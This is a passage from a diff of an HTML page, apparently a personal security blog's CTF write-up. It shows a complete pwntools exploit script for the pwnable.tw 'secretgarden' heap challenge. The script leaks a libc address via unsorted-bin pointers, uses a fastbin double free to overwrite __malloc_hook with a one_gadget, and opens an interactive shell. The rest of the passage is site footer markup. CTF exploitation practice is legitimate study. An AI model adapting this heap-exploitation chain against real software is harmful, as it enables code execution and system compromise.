+</span></span><span class="line"><span class="cl">  <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;chall.pwnable.tw&#39;</span><span class="p">,</span> <span class="mi">10203</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">lib_path</span><span class="o">+</span><span class="s1">&#39;/ld-2.23.so&#39;</span><span class="p">,</span> <span class="s1">&#39;./secretgarden&#39;</span><span class="p">],</span> \
+</span></span><span class="line"><span class="cl">    <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;LD_PRELOAD&#39;</span><span class="p">:</span><span class="s1">&#39;libc_64.so.6&#39;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="n">r</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="p">:</span> \
+</span></span><span class="line"><span class="cl">  <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span> <span class="k">if</span> <span class="n">r</span> <span class="k">else</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="n">r</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="p">:</span> \
+</span></span><span class="line"><span class="cl">  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span> <span class="k">if</span> <span class="n">r</span> <span class="k">else</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">raise_flower</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="p">,</span> <span class="n">color</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;raise_flower(</span><span class="si">{</span><span class="n">length</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">color</span><span class="si">}</span><span class="s2">)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">s</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;choice : &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">length</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="s1">&#39;name :&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">s</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;flower :&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">sl</span><span class="p">(</span><span class="n">color</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;the flower :&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">visit_garden</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">  <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;visit_garden()&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">s</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;choice : &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xe2\x98\x86</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">remove_flower</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;remove_flower(</span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s2">)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">s</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;choice : &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="s1">&#39;garden:&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">clean_garden</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">  <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;clean_garden()&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">s</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;4&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;choice : &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># leak unsorted bin pointers</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 0x410 outside of tcache bin field, im debugging on glibc 2.31</span>
+</span></span><span class="line"><span class="cl"><span class="n">raise_flower</span><span class="p">(</span><span class="mh">0x410</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">raise_flower</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">raise_flower</span><span class="p">(</span><span class="mh">0x410</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">raise_flower</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">remove_flower</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">remove_flower</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">raise_flower</span><span class="p">(</span><span class="mh">0x410</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;C&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;D&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">arena_base</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">visit_garden</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)[</span><span class="mi">4</span><span class="p">][</span><span class="o">-</span><span class="mi">6</span><span class="p">:],</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span><span class="o">-</span><span class="mi">1096</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">arena_base</span> <span class="o">-</span> <span class="mh">0x3c3b20</span>
+</span></span><span class="line"><span class="cl"><span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x3c3b10</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Arena base address: </span><span class="si">%#lx</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">arena_base</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Libc base address: </span><span class="si">%#lx</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">libc_base</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Malloc hook address: </span><span class="si">%#lx</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">malloc_hook</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># fastbin dup</span>
+</span></span><span class="line"><span class="cl"><span class="n">remove_flower</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">remove_flower</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">remove_flower</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">one_gadget</span> <span class="o">=</span> <span class="mh">0xef6c4</span>
+</span></span><span class="line"><span class="cl"><span class="n">raise_flower</span><span class="p">(</span><span class="mh">0x90</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;freeme&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">raise_flower</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">malloc_hook</span><span class="o">-</span><span class="mh">0x23</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">raise_flower</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">raise_flower</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">raise_flower</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x13</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="o">+</span><span class="n">libc_base</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">remove_flower</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">remove_flower</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div>
+            </div>
+        </article>
+    </main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/intranautic" target="_blank" rel="noopener noreferrer me" title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="https://twitter.com/intranautic" target="_blank" rel="noopener noreferrer me" title="Twitter">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z">
+    </path>
+</svg>
+</a>
+<a href="https://keybase.io/intranautic" target="_blank" rel="noopener noreferrer me" title="Keybase">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 71 76.3" version="1.1" fill="currentColor" stroke="none">
+    <path
+        d="M6.68 73.99c-.6-1.3-1.4-3.1-1.8-4l-.6-1.7-2 2.2-2 2.2-.2-4.2c-.3-6 .2-12.2 1.2-16.6 2.3-9.8 9.5-18.7 18.8-23.4l2.1-1-.5-1.5c-.3-.8-.6-2.5-.7-3.6l-.2-2.1-2.1-.2c-3.2-.3-4.9-1.2-6-3.5-.6-1.2-.6-1.4-.4-4.6.2-4.2.5-5.1 1.8-6.5 1.6-1.8 2.7-2.1 6.7-1.9 2.9.2 3.5.3 4.8.9.8.4 1.5.8 1.6.8.1 0 1-1.1 2.1-2.6l1.9-2.7 1.2.7c.7.4 1.5.9 1.9 1.1l.7.4-.6 1.5c-.3.8-.7 2.2-.8 2.9l-.2 1.4 1.7.2c6.1.6 10.7 4.3 12.4 9.9.5 1.8.5 5.3 0 7-.5 1.6-.5 1.7-.1 1.7.7 0 5.4 2.3 7.3 3.5 3.7 2.4 8 6.6 10.4 10.2 4.5 6.7 6.4 14 5.6 22-.4 4.8-1.3 8.6-2.9 12.3l-.6 1.4h-5l1.2-2.4c1.3-2.6 2.3-6.2 2.8-9.4.3-2.2.4-8.2.1-9.3l-.2-.7-1.3 1.4c-3.2 3.5-7.9 4.5-14.2 2.8-5.4-1.4-7.6-1.7-12.7-1.7-3.9 0-5.2.1-7.3.6-5.8 1.3-9.9 3.2-15.6 7.3-2.1 1.5-3.8 2.7-3.9 2.7-.1 0 .2-1 .6-2.3.4-1.3 1.1-3.4 1.5-4.8l.8-2.5-.9.9c-.5.5-1.9 1.9-3.1 3.2l-2.1 2.3.5 1.9c.6 2.5 2 5.6 3.5 7.9.6 1 1.1 1.8 1.1 1.9s-1.2.1-2.6.1h-2.6l-1.1-2.1zm8.8-24.2c4.8-5.1 8.7-9.2 8.8-9.2.1.1-.4 1.6-.9 3.3-3.3 10.4-4 12.4-3.9 12.5 0 0 1.2-.4 2.5-.9 8.5-3.7 18.4-4.2 28.9-1.4 4.7 1.2 6.5 1.2 8.8 0 1.3-.7 1.8-1.1 2.4-2.1 1.1-1.7 1.2-4.1.5-6.3-1.7-4.8-8.3-11-14.5-13.7-3.2-1.4-3.4-1.4-4.1-.7l-.6.6 2.6 3.2c1.4 1.7 2.9 3.6 3.1 4.1.6 1.2.7 3.1.1 4.3-.8 1.7-3.2 2.9-5.1 2.5-.8-.2-1.1-.1-1.9.5-2.2 1.6-4.6 1.2-6.6-1.2-1.6-1.8-2-2.7-2.1-4.5 0-.9-.3-2-.5-2.4-.3-.6-.4-1.3-.4-2.2l.1-1.4-1.3-.3c-1.8-.5-3.9-1.5-5.1-2.4-.6-.4-1.1-.8-1.3-.8s-1.5.6-2.9 1.3c-9.7 5-16 14.3-17 24.8-.1 1-.2 2.3-.3 2.8l-.1.9 1.1-1.1c.5-.5 4.9-5.1 9.7-10.2zm25.9-7.4c.9-.7 1.7-1.3 1.9-1.3.1 0 .4.3.7.7.5.8 1.4.8 1.8.1.3-.5.3-.6-5.6-7.8-3.5-4.3-4.2-5-4.7-5-1.2.1-.9 1 1 3.3l1.8 2.2-1 .8c-1.1 1-1.2 1.2-.5 1.8.5.5.6.4 1.6-.3l1.1-.7.7.6c.4.3.6.8.6.9 0 .2-.8.9-1.7 1.7-.9.7-1.6 1.5-1.6 1.7 0 .3.5 1.1 1.4 2.2.3.6.8.4 2.5-.9zm-10.3-14.2c.6-1.8 2.6-3.2 4.6-3.2 1.1 0 2.7.9 3.8 2.1l1 1.2.9-1.1c2.5-2.8 2.8-6.7.8-10.1-1.5-2.5-4.3-4-8.2-4.4-2.1-.2-2.6-.4-3.7-1.5l-.8-.8-.4.6c-.8 1.2-2.5 5.1-3 6.6-.7 2.3-.4 5.9.5 7.7.9 1.7 3.3 4 4 3.7.1.1.3-.3.5-.8zm-8.9-13.6c.2-.5.7-1.8 1.2-2.8.5-1 .9-2 .9-2.3 0-.9-1-1.3-3.7-1.5-2.4-.2-2.6-.1-3.1.4-.4.4-.6.9-.6 1.6 0 .6-.1 1.7-.2 2.6-.2 2.1.1 2.5 2.2 2.8 3.1.2 3 .2 3.3-.8zm-3.1-2.4c0-1.7.2-1.9 1.6-1.9h1.3v2.8h-2.8v-.9zm6.3 58.3c-.6-.6-.8-1-.8-2 0-1.9 1.1-3 2.9-3 1.7 0 2.9 1.2 2.9 2.9 0 1.8-1.1 2.8-3 2.9-1 0-1.4-.2-2-.8zm19.3.3a2.93 2.93 0 011.8-5.3c1.8 0 2.8 1.1 2.9 3 0 1.1-.1 1.4-.8 2s-1 .8-2 .8c-.9 0-1.5-.2-1.9-.5z" />
+</svg>
+</a>
+<a href="mailto:intranautic@gmail.com" target="_blank" rel="noopener noreferrer me" title="Email">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 21" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
+    <polyline points="22,6 12,13 2,6"></polyline>
+</svg>
+</a>
+<a href="/pgp.txt" target="_blank" rel="noopener noreferrer me" title="Pgp">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
+    <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
+</svg>
+</a>
+<a href="/index.xml" target="_blank" rel="noopener noreferrer me" title="Rss">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M4 11a9 9 0 0 1 9 9" />
+    <path d="M4 4a16 16 0 0 1 16 16" />
+    <circle cx="5" cy="19" r="1" />
+</svg>
+</a></div>
+    <small class="footer_copyright">
+        © 2023 Intranautic.
+    </small>
+</footer>
+
+<script src="https://intranautic.com/js/themeSwitchnMenu.min.2a402288242b6930b175a0722c267e2353055739b3975834df35e56d00dd8f50.js"></script></body>
+</html>
